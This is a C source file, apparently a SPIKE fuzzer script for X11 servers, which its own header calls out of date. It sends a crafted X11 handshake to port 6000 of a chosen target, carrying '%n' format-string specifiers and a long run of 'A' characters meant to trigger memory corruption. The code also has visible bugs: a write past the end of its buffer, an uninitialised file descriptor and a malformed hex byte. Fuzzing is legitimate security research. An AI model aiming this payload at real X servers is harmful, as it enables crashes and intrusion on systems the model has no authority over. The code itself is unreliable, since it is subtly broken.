/* 
   x11_spike.c

   Include routines for spiking the x11 server

   This is WAY out of date. Don't expect it to do anything interesting.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h> /*for memset*/
#include <sys/types.h>
#include "spike.h"
#include "hdebug.h"
#include "tcpstuff.h"



void
usage()
{
  fprintf(stderr,"Usage: pmspike target\n");
  exit(-1);
}

int
main (int argc, char ** argv)
{
  char * target;
  char buffer[1500000];

  struct spike * our_spike;
  unsigned long retval;
  int fd;

  if (argc!=2)
    {
      usage();
    }

  target=argv[1];
  printf("Target is %s\n",argv[1]);

  our_spike=new_spike();


  if (our_spike==NULL)
    {
      fprintf(stderr,"Malloc failed trying to allocate a spike.\n");
      exit(-1);
    }

  setspike(our_spike);

  memset(buffer,0x41,sizeof(buffer));
  buffer[sizeof(buffer)]=0;
  memcpy(buffer,"%n%n%n%n%n%n%n%n%n%n%n%n",strlen("%n%n%n%n%n%n%n%n%n%n%n%n"));
  buffer[4000]=0;

  /*last fragment and fragment length*/
  /*s_binary("80000028");*/
  /*this sets the flag for "final fragment" correctly*/
  s_binary("6c 00 ffffffff  12 00 10 00 00 00 4d 49 54 2d 4d 41 47 49 43 2d  43 4f 4f 4b 49 45 2d 31   00 00 5a f6 f1 59 1b dd  da c6 f7 e7 26 8f 7d 6131 19 ");
  /*data goes here*/
  s_string(buffer);
  /*end data*/


  /*
  s_print_buffer();
  s_printf_buffer();
  */

  if (spike_send_tcp(target,6000)<0)
    {
      printf("Couldn't connect to host or send data!\n");
      exit(-1);
    }
  retval=tcpread(fd,1000,buffer);
  printf("%s\n",buffer);
  return 0;
}







